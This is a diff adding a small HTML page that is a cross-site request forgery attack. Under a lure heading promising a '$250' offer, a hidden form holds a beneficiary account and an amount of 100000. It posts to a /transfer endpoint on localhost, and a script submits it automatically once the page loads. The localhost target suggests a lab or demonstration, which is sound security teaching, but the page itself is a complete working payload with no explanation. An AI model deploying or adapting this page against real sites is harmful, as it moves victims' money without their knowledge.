@@ -1,0 +1,15 @@
+<!doctype html>
+<h1>Hurry! Offer worth $250!</h1>
+
+<form name="auto-submit-form" id="auto-submit-form" action="http://localhost:5000/transfer" method="post">
+  <input type="hidden" name="beneficiary_account" value="45047580936" />
+  <input type="hidden" name="amount" value="100000" />
+</form>
+
+<script>
+  window.onload = function () {
+    setTimeout(function () {
+      document.forms["auto-submit-form"].submit();
+    }, 100);
+  };
+</script>
